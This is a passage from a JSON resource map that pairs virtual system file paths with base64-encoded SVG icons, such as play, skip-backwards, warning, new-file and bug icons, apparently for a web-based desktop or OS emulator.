"PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTcgN2gxMHYzbDQtNC00LTR2M0g1djZoMlY3em0xMCAxMEg3di0zbC00IDQgNCA0di0zaDEydi02aC0ydjR6Ii8+DQo8L3N2Zz4=", "/system/res/drawable/skipBackwards.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNNiA2aDJ2MTJINnptMy41IDZsOC41IDZWNnoiLz4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQo8L3N2Zz4=", "/system/res/drawable/warningDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEgMjFoMjJMMTIgMiAxIDIxem0xMi0zaC0ydi0yaDJ2MnptMC00aC0ydi00aDJ2NHoiLz4NCjwvc3ZnPg==", "/system/res/drawable/play.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNOCA1djE0bDExLTd6Ii8+DQogICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPg0KPC9zdmc+", "/system/app": {}, "/system/res/drawable/newFileLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNNiAyYy0xLjEgMC0xLjk5LjktMS45OSAyTDQgMjBjMCAxLjEuODkgMiAxLjk5IDJIMThjMS4xIDAgMi0uOSAyLTJWOGwtNi02SDZ6bTcgN1YzLjVMMTguNSA5SDEzeiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/app/FireBug/res/drawable/favico.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KICAgIDxwYXRoIGQ9Ik0yMCA4aC0yLjgxYy0uNDUtLjc4LTEuMDctMS40NS0xLjgyLTEuOTZMMTcgNC40MSAxNS41OSAzbC0yLjE3IDIuMTdDMTIuOTYgNS4wNiAxMi40OSA1IDEyIDVjLS40OSAwLS45Ni4wNi0xLjQxLjE3TDguNDEgMyA3IDQuNDFsMS42MiAxLjYzQzcuODggNi41NSA3LjI2IDcuMjIgNi44MSA4SDR2MmgyLjA5Yy0uMDUuMzMtLjA5LjY2LS4wOSAxdjFINHYyaDJ2MWMwIC4zNC4wNC42Ny4wOSAxSDR2MmgyLjgxYzEuMDQgMS43OSAyLjk3IDMgNS4xOSAzczQuMTUtMS4yMSA1LjE5LTNIMjB2LTJoLTIuMDljLjA1LS4zMy4wOS0uNjYuMDktMXYtMWgydi0yaC0ydi0xYzAtLjM0LS4wNC0uNjctLjA5LTFIMjBWOHptLTYgOGgtNHYtMmg0djJ6bTAtNGgtNHYtMmg0djJ6Ii8+Cjwvc3ZnPg=="}